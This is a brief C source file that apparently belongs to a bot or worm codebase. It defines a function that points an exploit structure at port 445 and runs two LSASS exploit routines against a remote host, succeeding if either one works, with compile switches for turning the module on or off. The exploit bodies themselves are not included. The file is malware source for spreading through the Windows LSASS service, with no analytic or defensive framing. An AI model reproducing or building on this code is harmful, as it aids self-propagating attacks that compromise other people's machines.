#include "../header/includes.h"
#include "../header/functions.h"
#include "../header/externs.h"

#ifndef NO_LSASS
#ifndef NO_LSASS1
#ifndef NO_LSASS1LSASS
BOOL lsass1lsass(EXINFO exinfo)
{
	exinfo.port = 445;
	BOOL bLSASS1 = Lsass1(exinfo);
	exinfo.port = 445;
	BOOL bLSASS = lsass(exinfo);

	return bLSASS1 || bLSASS ? TRUE : FALSE;
}
#endif
#endif
#endif